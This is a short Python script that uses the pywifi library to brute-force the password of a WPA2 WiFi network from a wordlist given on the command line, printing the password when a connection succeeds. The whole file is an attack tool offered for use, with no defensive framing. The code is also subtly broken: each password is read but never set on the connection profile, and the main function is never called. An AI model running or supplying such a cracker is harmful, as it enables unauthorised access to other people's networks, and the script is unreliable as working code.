import pywifi
import time
from pywifi import const

def wifi_scan():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]

    # Use argparse to pass arguments from the command line
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--ssid", help="WiFi SSID")
    parser.add_argument("-w", "--wordlist", help="Path to password list")
    args = parser.parse_args()

    client_ssid = args.ssid if args.ssid else "YOUR_WIFI_SSID"
    wordlist_path = args.wordlist if args.wordlist else "pwd.txt"

    with open(wordlist_path, "r") as f:
        for line in f:
            password = line.strip()
            # Create a profile compatible with your operating system
            profile = pywifi.Profile()
            profile.ssid = client_ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP

            # Try to connect to the WiFi network with the current password
            interface.remove_all_network_profiles()
            tmp_profile = interface.add_network_profile(profile)
            interface.connect(tmp_profile)
            time.sleep(1)
            if interface.status() == const.IFACE_CONNECTED:
                print("WiFi password found:", password)
                break
